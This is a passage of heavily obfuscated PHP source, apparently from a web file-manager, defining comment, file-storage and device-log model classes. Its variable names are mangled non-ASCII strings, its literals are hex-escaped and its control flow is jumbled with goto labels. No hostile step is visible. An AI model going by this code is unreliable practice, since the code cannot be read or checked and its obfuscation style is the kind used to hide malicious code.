($aïùåñ¸£Ø[$d”ËĞ‹ì±‰[29]] == $d”ËĞ‹ì±‰[2080]) { $aïùåñ¸£Ø[$d”ËĞ‹ì±‰[2308]] = $aïùåñ¸£Ø[$d”ËĞ‹ì±‰[391]]; $aïùåñ¸£Ø[$d”ËĞ‹ì±‰[2295]] = $aïùåñ¸£Ø[$d”ËĞ‹ì±‰[2308]][$d”ËĞ‹ì±‰[369]]; $aïùåñ¸£Ø[$d”ËĞ‹ì±‰[391]] = !1; $aïùåñ¸£Ø[$d”ËĞ‹ì±‰[369]] = $d”ËĞ‹ì±‰[33]; } if ($aïùåñ¸£Ø[$d”ËĞ‹ì±‰[391]] && $aïùåñ¸£Ø[$d”ËĞ‹ì±‰[391]][$d”ËĞ‹ì±‰[371]] == $d”ËĞ‹ì±‰[1089]) { $d‚–æË–[] = $c·¿½Ç«¤[$d”ËĞ‹ì±‰[367]]; unset($d»·²ŠµÃ—[$bêÚ‡”á©Æ]); continue; } goto E‘†™à˜Î; FÁˆÁâŸ«Ì: } $c·¿½Ç«¤[$d”ËĞ‹ì±‰[405]] = $aïùåñ¸£Ø; goto DŠ¶ìÊã¥²; C²ì‘«Íîó: $c·¿½Ç«¤[$d”ËĞ‹ì±‰[2251]] = $fìÙˆ¿¼÷; $aïùåñ¸£Ø = json_decode($c·¿½Ç«¤[$d”ËĞ‹ì±‰[405]], !0); $c·¿½Ç«¤[$d”ËĞ‹ì±‰[2474]] = isset($aïùåñ¸£Ø[$d”ËĞ‹ì±‰[2474]]) ? $aïùåñ¸£Ø[$d”ËĞ‹ì±‰[2474]] : $d”ËĞ‹ì±‰[33]; goto C»¦¨ŞÌğ; dßñ£ë¤Ø: $c·¿½Ç«¤[$d”ËĞ‹ì±‰[28]] = isset($fìÙˆ¿¼÷[$d”ËĞ‹ì±‰[28]]) ? $fìÙˆ¿¼÷[$d”ËĞ‹ì±‰[28]] : LNG($d”ËĞ‹ì±‰[2475]); $c·¿½Ç«¤[$d”ËĞ‹ì±‰[2343]] = isset($fìÙˆ¿¼÷[$d”ËĞ‹ì±‰[2343]]) ? $fìÙˆ¿¼÷[$d”ËĞ‹ì±‰[2343]] : $d”ËĞ‹ì±‰[33]; $c·¿½Ç«¤[$d”ËĞ‹ì±‰[1352]] = isset($BÖÁÏ¥š´[$aÍ¾¥šó¨´]) ? $BÖÁÏ¥š´[$aÍ¾¥šó¨´] : $a¢ÄòË®Ú; goto C²ì‘«Íîó; D¼âŒ©©î: $aÍ¾¥šó¨´ = $c·¿½Ç«¤[$d”ËĞ‹ì±‰[29]]; $fìÙˆ¿¼÷ = isset($b§Š¬à‹ŒÂ[$c·¿½Ç«¤[$d”ËĞ‹ì±‰[1446]]]) ? $b§Š¬à‹ŒÂ[$c·¿½Ç«¤[$d”ËĞ‹ì±‰[1446]]] : !1; $a¢ÄòË®Ú = strpos($aÍ¾¥šó¨´, $d”ËĞ‹ì±‰[2479]) === 0 ? LNG($d”ËĞ‹ì±‰[2480]) : LNG($d”ËĞ‹ì±‰[2475]); goto dßñ£ë¤Ø; a ì—’¾ËÑ: } $this->clearSystemPathLog($d‚–æË–); goto c—ÌÏŒ‰âµ; E“–½½ÈÚ¢: $aÊŞäĞŒ’˜ = $this->getSourceList($d»·²ŠµÃ—); $BÖÁÏ¥š´ = $this->typeAll(); $CÒÊà¿Øš¤ = array(); goto cˆóÉÁƒÜò; FÕğïƒ‡²¸: $d”ËĞ‹ì±‰ =& $_SERVER[¯Ò¬Èè]; $bš¯×½ç« = array_to_keyvalue($d»·²ŠµÃ—, $d”ËĞ‹ì±‰[33], $d”ËĞ‹ì±‰[1446]); $b§Š¬à‹ŒÂ = Model($d”ËĞ‹ì±‰[477])->userListInfo(array_unique($bš¯×½ç«)); goto E“–½½ÈÚ¢; EàçÍ‘½œä: } private function clearSystemPathLog($f¼Ä‚ß¤òÜ) { $CÖíÄÉñÇ¸ =& $_SERVER[¯Ò¬Èè]; if (count($f¼Ä‚ß¤òÜ) == 0) { return; } $bš›‡´¨‡É = array($CÖíÄÉñÇ¸[367] => array($CÖíÄÉñÇ¸[7], array_unique($f¼Ä‚ß¤òÜ))); $this->where($bš›‡´¨‡É)->delete(); } public function deviceList($E÷ğãÍ“–æ, $F×·óåâÒ‘ = 0) { $b”ÃÖõ‰¢Ñ =& $_SERVER[¯Ò¬Èè]; $f‘§öí´Å• = array($b”ÃÖõ‰¢Ñ[1446] => $E÷ğãÍ“–æ, $b”ÃÖõ‰¢Ñ[187] => array($b”ÃÖõ‰¢Ñ[937], $F×·óåâÒ‘), $b”ÃÖõ‰¢Ñ[29] => $b”ÃÖõ‰¢Ñ[2053]); $BÃÒÅŠ ·· = array(); $D™ŒÁÉ…’Ö = $this->field($b”ÃÖõ‰¢Ñ[2482])->where($f‘§öí´Å•)->order($b”ÃÖõ‰¢Ñ[2306])->limit(50)->select(); foreach ($D™ŒÁÉ…’Ö as $cøî»‰´Û => $bæÌœÕ¹) { goto C—Œ„®Â’; E¨‹ÃÙ…¬á: unset($AÏ¾¤ÙçØ»[$b”ÃÖõ‰¢Ñ[2474]]); $dåÚÄ½š‘œ = $this->deviceType($AÏ¾¤ÙçØ»[$b”ÃÖõ‰¢Ñ[2297]]); if (isset($BÃÒÅŠ ··[$dåÚÄ½š‘œ])) { continue; } goto bßƒ‘©¹ÁÕ; C—Œ„®Â’: if ($cøî»‰´Û > 0 && abs($bæÌœÕ¹[$b”ÃÖõ‰¢Ñ[187]] - $D™ŒÁÉ…’Ö[$cøî»‰´Û - 1][$b”ÃÖõ‰¢Ñ[187]]) < 5) { continue; } $AÏ¾¤ÙçØ» = json_decode($bæÌœÕ¹[$b”ÃÖõ‰¢Ñ[405]], !0); $bæÌœÕ¹[$b”ÃÖõ‰¢Ñ[2474]] = isset($AÏ¾¤ÙçØ»[$b”ÃÖõ‰¢Ñ[2474]]) ? $AÏ¾¤ÙçØ»[$b”ÃÖõ‰¢Ñ[2474]] : $b”ÃÖõ‰¢Ñ[33]; goto E¨‹ÃÙ…¬á; bßƒ‘©¹ÁÕ: $this->ipAddress($bæÌœÕ¹); $bæÌœÕ¹[$b”ÃÖõ‰¢Ñ[405]] = $AÏ¾¤ÙçØ»; $BÃÒÅŠ ··[$dåÚÄ½š‘œ] = $bæÌœÕ¹; goto EŒÑ©ÇĞº; EŒÑ©ÇĞº: } return array_values($BÃÒÅŠ ··); } public function deviceType($bĞ«Ñˆ•›×) { return $bĞ«Ñˆ•›×; } } goto E›š¢±åƒ; CÖÎß’˜‚î: class CommentModel extends ModelBase { protected $tableName = "\x63\157\155\155\145\x6e\x74"; protected $tableMeta = array("\164\x61\x62\x6c\x65\x4e\x61\155\x65" => "\143\x6f\x6d\155\145\156\x74\137\155\145\x74\x61", "\155\145\164\x61\106\x69\145\154\144" => "\143\x6f\155\155\145\x6e\x74\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($CÕ‘·–§’) { $bõï˜Š­­ã =& $_SERVER[¯Ò¬Èè]; if ($CÕ‘·–§’[$bõï˜Š­­ã[2141]]) { $C·éÓ¯èÒÙ = $this->where(array($bõï˜Š­­ã[2142] => $CÕ‘·–§’[$bõï˜Š­­ã[2141]]))->find(); if (!$C·éÓ¯èÒÙ || $C·éÓ¯èÒÙ[$bõï˜Š­­ã[371]] != $CÕ‘·–§’[$bõï˜Š­­ã[371]] || $C·éÓ¯èÒÙ[$bõï˜Š­­ã[456]] != $CÕ‘·–§’[$bõï˜Š­­ã[456]]) { return !1; } $this->where(array($bõï˜Š­­ã[2142] => $CÕ‘·–§’[$bõï˜Š­­ã[2141]]))->setAdd($bõï˜Š­­ã[2143], 1); } return $this->add($CÕ‘·–§’); } public function remove($E˜Š¶æšè¡) { $eæ•Ã–ğÈÖ =& $_SERVER[¯Ò¬Èè]; $CÖß©™â…¨ = array($eæ•Ã–ğÈÖ[2142] => $E˜Š¶æšè¡); $F§£ÍÇæÎ˜ = $this->where($CÖß©™â…¨)->find(); if ($F§£ÍÇæÎ˜[$eæ•Ã–ğÈÖ[2141]]) { $this->where(array($eæ•Ã–ğÈÖ[2142] => $F§£ÍÇæÎ˜[$eæ•Ã–ğÈÖ[2141]]))->setAdd($eæ•Ã–ğÈÖ[2143], -1); } return $this->where($CÖß©™â…¨)->delete(); } public function edit($B¸ÎøÀ²¡, $dÕ«İèëÖ“) { $aŒß»¢†±¿ =& $_SERVER[¯Ò¬Èè]; $EÍíÌƒ‘› = array($aŒß»¢†±¿[2142] => $B¸ÎøÀ²¡); return $this->where($EÍíÌƒ‘›)->save(array($aŒß»¢†±¿[2144] => $dÕ«İèëÖ“)); } public function prasise($A‰»†§­Òù) { $F¤“ã‚ˆ¯Ğ =& $_SERVER[¯Ò¬Èè]; $a²µÎ¦–•š = Model($F¤“ã‚ˆ¯Ğ[2145]); $BÙÎÍ½ÊÓ¥ = array($F¤“ã‚ˆ¯Ğ[2142] => $A‰»†§­Òù, $F¤“ã‚ˆ¯Ğ[1437] => USER_ID); $DŒ¯ÄíµĞÇ = $a²µÎ¦–•š->where($BÙÎÍ½ÊÓ¥)->find(); if (!$DŒ¯ÄíµĞÇ) { $a²µÎ¦–•š->add($BÙÎÍ½ÊÓ¥); $dµ§¨î—ø = $this->where(array($F¤“ã‚ˆ¯Ğ[2142] => $A‰»†§­Òù))->setAdd($F¤“ã‚ˆ¯Ğ[2146], 1); } else { $a²µÎ¦–•š->where($BÙÎÍ½ÊÓ¥)->delete(); $dµ§¨î—ø = $this->where(array($F¤“ã‚ˆ¯Ğ[2142] => $A‰»†§­Òù))->setAdd($F¤“ã‚ˆ¯Ğ[2146], -1); } return $dµ§¨î—ø; } public function targetInfo($Bšª¶¡„®ğ, $BÛ…ãÂÑ³‰) { goto A»†‡èÛ¢ø; f÷âˆÚÂãÇ: $AŒİ’ß ‘ó = "\x52\111\x47\110\124\40\x4a\117\111\116\x20{$this->tablePrefix}\143\x6f\155\155\145\156\x74\x5f\x70\162\141\151\x73\145\x20\163\164\x61\x72\x20\157\x6e\x20\x63\x6f\x6d\155\x65\156\x74\56\143\157\155\155\x65\x6e\x74\111\104\40\x3d\x20\163\164\x61\162\x2e\143\x6f\x6d\155\145\156\x74\x49\104"; $CÒ–«ß¨† = $this->alias($aæ¹¢èˆ‹´[341])->where($Cäïï¸£ê§)->join($AŒİ’ß ‘ó, $aæ¹¢èˆ‹´[2147])->count(); $f”–³¶‹“Ê = array($aæ¹¢èˆ‹´[2148] => $cƒÖÛˆÆò, $aæ¹¢èˆ‹´[2149] => $CÒ–«ß¨†); goto Eá¯Ç¥º®; Eá¯Ç¥º®: return $f”–³¶‹“Ê; goto díé³èè; A»†‡èÛ¢ø: $aæ¹¢èˆ‹´ =& $_SERVER[¯Ò¬Èè]; $Cäïï¸£ê§ = array($aæ¹¢èˆ‹´[530] => $Bšª¶¡„®ğ, $aæ¹¢èˆ‹´[531] => $BÛ…ãÂÑ³‰); $cƒÖÛˆÆò = $this->where($Cäïï¸£ê§)->count(); goto f÷âˆÚÂãÇ; díé³èè: } public function listData($fî¶áŠÍä¹) { $F®ˆïÑÃ… =& $_SERVER[¯Ò¬Èè]; if (isset($fî¶áŠÍä¹[$F®ˆïÑÃ…[2150]])) { if ($fî¶áŠÍä¹[$F®ˆïÑÃ…[2150]]) { $fî¶áŠÍä¹[$F®ˆïÑÃ…[2151]] = array($F®ˆïÑÃ…[937], intval($fî¶áŠÍä¹[$F®ˆïÑÃ…[2150]])); } unset($fî¶áŠÍä¹[$F®ˆïÑÃ…[2150]]); } if (isset($fî¶áŠÍä¹[$F®ˆïÑÃ…[2152]])) { if ($fî¶áŠÍä¹[$F®ˆïÑÃ…[2152]]) { $fî¶áŠÍä¹[$F®ˆïÑÃ…[2151]] = array($F®ˆïÑÃ…[934], intval($fî¶áŠÍä¹[$F®ˆïÑÃ…[2152]])); } unset($fî¶áŠÍä¹[$F®ˆïÑÃ…[2152]]); } return $this->_listData($fî¶áŠÍä¹); } private function _listData($a–©©„æáĞ) { $E“İ§ĞÃ¨ª =& $_SERVER[¯Ò¬Èè]; $B´Á’®¤Ï = $this->where($a–©©„æáĞ)->_makeOrder()->selectPage(100); $this->_listAppendParent($B´Á’®¤Ï[$E“İ§ĞÃ¨ª[354]]); $this->_listAppendUser($B´Á’®¤Ï[$E“İ§ĞÃ¨ª[354]]); $this->_listAppendMeta($B´Á’®¤Ï[$E“İ§ĞÃ¨ª[354]]); return $B´Á’®¤Ï; } private function _makeOrder() { $C¬‘¸ÆŠ»Õ =& $_SERVER[¯Ò¬Èè]; $bºˆŒ¨ÂÀ = array($C¬‘¸ÆŠ»Õ[2146], $C¬‘¸ÆŠ»Õ[2143], $C¬‘¸ÆŠ»Õ[187]); $BçØ¨ÒŸ¯à = Input::get($C¬‘¸ÆŠ»Õ[407], $C¬‘¸ÆŠ»Õ[7], $C¬‘¸ÆŠ»Õ[389], $bºˆŒ¨ÂÀ); $d×±‚ùÓñ½ = Input::get($C¬‘¸ÆŠ»Õ[408], $C¬‘¸ÆŠ»Õ[7], $C¬‘¸ÆŠ»Õ[1439], array($C¬‘¸ÆŠ»Õ[2153], $C¬‘¸ÆŠ»Õ[405])); $b¶ã½ƒŠ«Ó = $BçØ¨ÒŸ¯à . $C¬‘¸ÆŠ»Õ[50] . $d×±‚ùÓñ½; return $this->order($b¶ã½ƒŠ«Ó); } private function _listAppendParent(&$e¨ÙÃ³Û¼æ) { goto A÷Ğè‰¤Ó¡; FçµŠ¨¹÷: if (!$F ”ˆÓ°Ê®) { return; } $a°î¶¾ÔºÒ = $this->where(array($F‘ä‹Öª”Ì[2142] => array($F‘ä‹Öª”Ì[7], $F ”ˆÓ°Ê®)))->select(); $a°î¶¾ÔºÒ = array_to_keyvalue($a°î¶¾ÔºÒ, $F‘ä‹Öª”Ì[2151]); goto F¤£ƒŒÇ; A÷Ğè‰¤Ó¡: $F‘ä‹Öª”Ì =& $_SERVER[¯Ò¬Èè]; $F ”ˆÓ°Ê® = array_unique(array_to_keyvalue($e¨ÙÃ³Û¼æ, $F‘ä‹Öª”Ì[33], $F‘ä‹Öª”Ì[2141])); $F ”ˆÓ°Ê® = array_remove_value($F ”ˆÓ°Ê®, $F‘ä‹Öª”Ì[468]); goto FçµŠ¨¹÷; F¤£ƒŒÇ: foreach ($e¨ÙÃ³Û¼æ as &$DºÛïœ´âÜ) { if (isset($a°î¶¾ÔºÒ[$DºÛïœ´âÜ[$F‘ä‹Öª”Ì[2141]]])) { $DºÛïœ´âÜ[$F‘ä‹Öª”Ì[2154]] = $a°î¶¾ÔºÒ[$DºÛïœ´âÜ[$F‘ä‹Öª”Ì[2141]]]; } } goto Cø †—Î¶è; Cø †—Î¶è: } private function _listAppendUser(&$EƒÕé‘Ô¾š) { goto eÀõƒæ¤ä„; bÒãÕÅŠ™Ä: if (count($E©Œ½¼ê‹) == 0) { return; } foreach ($EƒÕé‘Ô¾š as $B²»‚„ºÎá) { if (isset($B²»‚„ºÎá[$a°›§äßÚ·[2154]])) { $E©Œ½¼ê‹[] = $B²»‚„ºÎá[$a°›§äßÚ·[2154]][$a°›§äßÚ·[1446]]; } } $Cğğ¥Ş‘È = Model($a°›§äßÚ·[477])->userListInfo($E©Œ½¼ê‹); goto D„ŒÑ íº; D„ŒÑ íº: foreach ($EƒÕé‘Ô¾š as &$B²»‚„ºÎá) { $B²»‚„ºÎá[$a°›§äßÚ·[544]] = $Cğğ¥Ş‘È[$B²»‚„ºÎá[$a°›§äßÚ·[1446]]]; if (isset($B²»‚„ºÎá[$a°›§äßÚ·[2154]])) { $B²»‚„ºÎá[$a°›§äßÚ·[2154]][$a°›§äßÚ·[544]] = $Cğğ¥Ş‘È[$B²»‚„ºÎá[$a°›§äßÚ·[2154]][$a°›§äßÚ·[1446]]]; } } goto AÈ¶õïÍŠ; eÀõƒæ¤ä„: $a°›§äßÚ· =& $_SERVER[¯Ò¬Èè]; $E©Œ½¼ê‹ = array_unique(array_to_keyvalue($EƒÕé‘Ô¾š, $a°›§äßÚ·[33], $a°›§äßÚ·[1446])); $E©Œ½¼ê‹ = array_remove_value($E©Œ½¼ê‹, $a°›§äßÚ·[468]); goto bÒãÕÅŠ™Ä; AÈ¶õïÍŠ: } private function _listAppendMeta(&$f§‘¡ñšÆ) { goto C¨Ç‚¥àÛÏ; C¨Ç‚¥àÛÏ: $aåªÙË’Ÿ =& $_SERVER[¯Ò¬Èè]; $C™‹…Ã¤ƒ = array_unique(array_to_keyvalue($f§‘¡ñšÆ, $aåªÙË’Ÿ[33], $aåªÙË’Ÿ[2151])); $C™‹…Ã¤ƒ = array_remove_value($C™‹…Ã¤ƒ, $aåªÙË’Ÿ[468]); goto bËö—º…¼Ó; bËö—º…¼Ó: if (!$C™‹…Ã¤ƒ) { return; } foreach ($f§‘¡ñšÆ as $fœÇšÍ¶™) { if (isset($fœÇšÍ¶™[$aåªÙË’Ÿ[2154]])) { $C™‹…Ã¤ƒ[] = $fœÇšÍ¶™[$aåªÙË’Ÿ[2154]][$aåªÙË’Ÿ[2151]]; } } $CÑ­„¡²ƒ = $this->metaList($C™‹…Ã¤ƒ); goto aÁ“ ù‘©İ; aÁ“ ù‘©İ: if (!$CÑ­„¡²ƒ) { return !1; } foreach ($f§‘¡ñšÆ as &$fœÇšÍ¶™) { $fœÇšÍ¶™[$aåªÙË’Ÿ[417]] = $CÑ­„¡²ƒ[$fœÇšÍ¶™[$aåªÙË’Ÿ[2151]]]; if (isset($fœÇšÍ¶™[$aåªÙË’Ÿ[2154]])) { $fœÇšÍ¶™[$aåªÙË’Ÿ[2154]][$aåªÙË’Ÿ[417]] = $CÑ­„¡²ƒ[$fœÇšÍ¶™[$aåªÙË’Ÿ[2154]][$aåªÙË’Ÿ[2151]]]; } } goto d–â¦Ïµ¨Ã; d–â¦Ïµ¨Ã: } private function metaList($CĞ…Üƒæõç) { goto BÑÄ§¸©ØÈ; d¹´ß»ƒ…ç: $e¯³Í‚®©ë = Model($C¿™è²«ãÕ[2155])->where($FÚªªí¢í¬)->select(); $e¯³Í‚®©ë = array_to_keyvalue_group($e¯³Í‚®©ë, $C¿™è²«ãÕ[2151]); foreach ($e¯³Í‚®©ë as $C©ÙïóñÖÃ => $DİŒà«ùôÛ) { $FÛôÔõš¤Ê = array(); foreach ($DİŒà«ùôÛ as $dø¾šğÌÒñ) { $FÛôÔõš¤Ê[$dø¾šğÌÒñ[$C¿™è²«ãÕ[89]]] = $dø¾šğÌÒñ[$C¿™è²«ãÕ[359]]; } $e¯³Í‚®©ë[$C©ÙïóñÖÃ] = $FÛôÔõš¤Ê; } goto D ´£„‰À¦; D ´£„‰À¦: return $e¯³Í‚®©ë ? $e¯³Í‚®©ë : array(); goto cÅÙ§‚¬øç; BÑÄ§¸©ØÈ: $C¿™è²«ãÕ =& $_SERVER[¯Ò¬Èè]; if (!$CĞ…Üƒæõç) { return array(); } $FÚªªí¢í¬ = array($C¿™è²«ãÕ[2151] => array($C¿™è²«ãÕ[7], $CĞ…Üƒæõç)); goto d¹´ß»ƒ…ç; cÅÙ§‚¬øç: } } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\x66\x69\x6c\145"; protected $tableMeta = array("\x74\141\142\x6c\x65\116\x61\155\x65" => "\151\x6f\x5f\146\x69\154\x65\137\155\145\164\x61", "\155\145\164\x61\x46\151\145\x6c\x64" => "\x66\151\154\145\111\104"); public function fileInfo($Dì°Æ‹¶ŸŠ) { $F¢ë© Ö¹¾ =& $_SERVER[¯Ò¬Èè]; static $FˆÂË¯š¹© = array(); if (!isset($FˆÂË¯š¹©[$Dì°Æ‹¶ŸŠ])) { $a’Í¬ß…Ê = $F¢ë© Ö¹¾[2156]; $b–ê‰×š–í = Model($F¢ë© Ö¹¾[422])->field($a’Í¬ß…Ê)->where(array($F¢ë© Ö¹¾[420] => $Dì°Æ‹¶ŸŠ))->find(); $FˆÂË¯š¹©[$Dì°Æ‹¶ŸŠ] = $b–ê‰×š–í; } return $FˆÂË¯š¹©[$Dì°Æ‹¶ŸŠ]; } public function addFileByContent($AãğÅ›’Öƒ = '', $Cà‚‰ƒàÎ = '') { goto a¤•Î­Œ‹Š; A‚ÙÒè‰: $f¹Ö¦ëëºà = $bØè´ôÆˆ . $A™šŞœÄµÚ[2158] . rand_string(16); file_put_contents($f¹Ö¦ëëºà, $AãğÅ›’Öƒ); $D§ĞÒÌí·  = $this->addFile($f¹Ö¦ëëºà, $Cà‚‰ƒàÎ, !0); goto a…­‚±ÆÌ®; a¤•Î­Œ‹Š: $A™šŞœÄµÚ =& $_SERVER[¯Ò¬Èè]; $bØè´ôÆˆ = TEMP_PATH . $A™šŞœÄµÚ[2157]; if (!is_dir($bØè´ôÆˆ)) { mk_dir($bØè´ôÆˆ); } goto A‚ÙÒè‰; a…­‚±ÆÌ®: if (file_exists($f¹Ö¦ëëºà)) { @unlink($f¹Ö¦ëëºà); } return $D§ĞÒÌí· ; goto dÜâíÍ±Ì; dÜâíÍ±Ì: } public function createFileName($bæ¿„„·¥„) { goto cùË–¬¥ç‡; cùË–¬¥ç‡: $aÇÚÏ–¿ë› =& $_SERVER[¯Ò¬Èè]; $böõ¦½ËÙ = IO::init($aÇÚÏ–¿ë›[8]); $Dœï²ë›‡¼ = $this->makeFilePath($bæ¿„„·¥„, $böõ¦½ËÙ); goto aË©¸é„Ğá; f’‡ƒÇµà¾: if (!$b·ãÄìˆ¾Æ && !Cache::get($E¯©ÃŠĞïØ)) { $b·ãÄìˆ¾Æ = !0; $b£¬ï—Ô«È = IO::mkdir($cÊª³ë½Ïê); if (!IO::exist($b£¬ï—Ô«È . $aÇÚÏ–¿ë›[2160])) { IO::mkfile($b£¬ï—Ô«È . $aÇÚÏ–¿ë›[2160]); } Cache::set($E¯©ÃŠĞïØ, 1, 3600 * 2); } return $Dœï²ë›‡¼; goto f‡ß¹ ŒÎ ; aË©¸é„Ğá: $cÊª³ë½Ïê = $böõ¦½ËÙ->pathFather($Dœï²ë›‡¼); static $b·ãÄìˆ¾Æ = false; $E¯©ÃŠĞïØ = $aÇÚÏ–¿ë›[2159] . md5($cÊª³ë½Ïê); goto f’‡ƒÇµà¾; f‡ß¹ ŒÎ : } public function makeFilePath($Có¥å‹§”„, $A†ÅÖàæŸÙ) { goto aŒ¯Ì‰¸µ¾; Dç÷‰ÊÈ”: $cÏÕêà’ì = $FªóíäØ‹» . rand_string(5) . short_id(100); $Có¥å‹§”„ = str_replace($AóÙ‘§ÔëÔ[8], $AóÙ‘§ÔëÔ[70], KodIO::clear($Có¥å‹§”„)); if (!$Có¥å‹§”„) { $C´¥òê§øÈ = $AóÙ‘§ÔëÔ[2163]; } goto eôò¥ò›•œ; aŒ¯Ì‰¸µ¾: $AóÙ‘§ÔëÔ =& $_SERVER[¯Ò¬Èè]; $C´¥òê§øÈ = Model($AóÙ‘§ÔëÔ[1097])->get($AóÙ‘§ÔëÔ[2161]); $FªóíäØ‹» = KodIO::defaultIO() . date($AóÙ‘§ÔëÔ[2162]); goto Dç÷‰ÊÈ”; eôò¥ò›•œ: switch ($C´¥òê§øÈ) { case $AóÙ‘§ÔëÔ[2164]: $cÏÕêà’ì = $cÏÕêà’ì . $AóÙ‘§ÔëÔ[91] . $A†ÅÖàæŸÙ->ext($Có¥å‹§”„); if ($A†ÅÖàæŸÙ->ext($Có¥å‹§”„) == $AóÙ‘§ÔëÔ[2104]) { $cÏÕêà’ì .= $AóÙ‘§ÔëÔ[2165]; } break; case $AóÙ‘§ÔëÔ[2166]: goto bÆ¨Â¦ÛÕÎ; bÆ¨Â¦ÛÕÎ: $Bìºª¨»Õ = Model($AóÙ‘§ÔëÔ[1097])->get($AóÙ‘§ÔëÔ[1345]); $BÌæ¤ÄŸ = substr(md5($AóÙ‘§ÔëÔ[1923] . $Bìºª¨»Õ . date($AóÙ‘§ÔëÔ[701])), 0, 8); $FªóíäØ‹» = KodIO::defaultIO() . date($AóÙ‘§ÔëÔ[2167]) . $BÌæ¤ÄŸ . $AóÙ‘§ÔëÔ[8]; goto a‹÷×”ƒåÑ; a“ìíê”îß: break; goto eœ³Â˜Ÿ„ ; a‹÷×”ƒåÑ: if ($A†ÅÖàæŸÙ->ext($Có¥å‹§”„) == $AóÙ‘§ÔëÔ[2104]) { $Có¥å‹§”„ .= $AóÙ‘§ÔëÔ[2165]; } $Fµù‹†Û = IO::fileNameAuto($FªóíäØ‹», $Có¥å‹§”„); $cÏÕêà’ì = $FªóíäØ‹» . $Fµù‹†Û; goto a“ìíê”îß; eœ³Â˜Ÿ„ : case $AóÙ‘§ÔëÔ[2163]: break; default: break; } return $cÏÕêà’ì; goto Dîó‡Û®˜Ã; Dîó‡Û®˜Ã: } public function addFileByRemote($dÍí­‚Œ‚¢, $bØ«—¸µ×Œ, $F¾ïĞ¹àëÉ = array()) { goto b²„ÌÔİ…¾; fø†Ñšˆñ: $EäñÅ¼ˆãä = IO::hashMd5($dÍí­‚Œ‚¢, $Dù•å×¶â‡); $Cåö¶Ò‘ = KodIO::defaultDriver(); $cİÀ­‚„…† = array($CÛª›ËğğÒ[529] => IO::size($dÍí­‚Œ‚¢), $CÛª›ËğğÒ[2168] => 1, $CÛª›ËğğÒ[386] => $bØ«—¸µ×Œ, $CÛª›ËğğÒ[750] => $Cåö¶Ò‘[$CÛª›ËğğÒ[367]], $CÛª›ËğğÒ[387] => $dÍí­‚Œ‚¢, $CÛª›ËğğÒ[2169] => $F¾ïĞ¹àëÉ[$CÛª›ËğğÒ[164]] ? $F¾ïĞ¹àëÉ[$CÛª›ËğğÒ[164]] : IO::hashSimple($dÍí­‚Œ‚¢), $CÛª›ËğğÒ[2170] => $EäñÅ¼ˆãä ? $EäñÅ¼ˆãä : $Dù•å×¶â‡); goto D¡ø–î»ôƒ; b²„ÌÔİ…¾: $CÛª›ËğğÒ =& $_SERVER[¯Ò¬Èè]; if (!IO::exist($dÍí­‚Œ‚¢)) { return !1; } $Dù•å×¶â‡ = $F¾ïĞ¹àëÉ[$CÛª›ËğğÒ[163]] ? $F¾ïĞ¹àëÉ[$CÛª›ËğğÒ[163]] : $CÛª›ËğğÒ[33]; goto fø†Ñšˆñ; D¡ø–î»ôƒ: if ($BåÍËñöùì = $this->addFileCheckExist($cİÀ­‚„…†[$CÛª›ËğğÒ[164]], $cİÀ­‚„…†[$CÛª›ËğğÒ[163]], $cİÀ­‚„…†[$CÛª›ËğğÒ[77]])) { return $BåÍËñöùì; } return $this->addFileData($cİÀ­‚„…†); goto e³‰´ŞóŞ—; e³‰´ŞóŞ—: } private function addFileData($a–â½ùØ‘Ñ) { $f¦åÉ‹¦Š» =& $_SERVER[¯Ò¬Èè]; if (!$a–â½ùØ‘Ñ) { return !1; } $a–â½ùØ‘Ñ[$f¦åÉ‹¦Š»[77]] = intval($a–â½ùØ‘Ñ[$f¦åÉ‹¦Š»[77]]); if (!$a–â½ùØ‘Ñ[$f¦åÉ‹¦Š»[77]] && strlen($a–â½ùØ‘Ñ[$f¦åÉ‹¦Š»[164]]) > 32) { $a–â½ùØ‘Ñ[$f¦åÉ‹¦Š»[77]] = intval(substr($a–â½ùØ‘Ñ[$f¦åÉ‹¦Š»[164]], 32)); } $fÍêÉÍãÄ = $this->add($a–â½ùØ‘Ñ); return $this->find($fÍêÉÍãÄ); } public function addFile($Bí·Ò‡Æâ´, $Eº½Õ™»ÕÛ, $cçÑƒÎê÷¯ = false) { $eéõ£‹ŒÖ = IO::hashSimple($Bí·Ò‡Æâ´); $E–Ğ´ŞîñŞ = IO::hashMd5($Bí·Ò‡Æâ´); $c‡ËĞŸÛÜµ = IO::size($Bí·Ò‡Æâ´); if ($E‰’÷¦òŠ« = $this->addFileCheckExist($eéõ£‹ŒÖ, $E–Ğ´ŞîñŞ, $c‡ËĞŸÛÜµ)) { return $E‰’÷¦òŠ«; } $bƒ¦Å×¹ = $this->addFileMake($Bí·Ò‡Æâ´, $c‡ËĞŸÛÜµ, $eéõ£‹ŒÖ, $E–Ğ´ŞîñŞ, $Eº½Õ™»ÕÛ, $cçÑƒÎê÷¯); return $this->addFileData($bƒ¦Å×¹); } public function addFileMake($c¸¸«Ë¿·, $dß“ë¿‹Ë†, $dØæ«´íÖˆ, $e æÏ‡…ÁÁ, $C‚–©’Ï, $a‚¨°¡óÒæ) { goto dàêÓŠŸ‡; Eİµ•ÌÙÔ‚: $C˜ÄÀº„¨Ç = get_path_this($B³Í‚‡¦Ñ); if ($a‚¨°¡óÒæ) { $B’®÷”Çó¹ = IO::move($c¸¸«Ë¿·, $B©âíªˆ¹â, !1, $C˜ÄÀº„¨Ç); } else { $B’®÷”Çó¹ = IO::copy($c¸¸«Ë¿·, $B©âíªˆ¹â, !1, $C˜ÄÀº„¨Ç); } if (!$B’®÷”Çó¹) { return !1; } goto FÑ³·¯ŠËõ; FÑ³·¯ŠËõ: $b’¶»ÄèË = KodIO::defaultDriver(); $FË“àÇİé® = array($BÌƒ—ãÃÍ¾[529] => $dß“ë¿‹Ë†, $BÌƒ—ãÃÍ¾[2168] => 1, $BÌƒ—ãÃÍ¾[386] => $C‚–©’Ï, $BÌƒ—ãÃÍ¾[750] => $b’¶»ÄèË[$BÌƒ—ãÃÍ¾[367]], $BÌƒ—ãÃÍ¾[387] => $B³Í‚‡¦Ñ, $BÌƒ—ãÃÍ¾[2169] => $dØæ«´íÖˆ, $BÌƒ—ãÃÍ¾[2170] => $e æÏ‡…ÁÁ); return $FË“àÇİé®; goto f‡’©ğ£åœ; 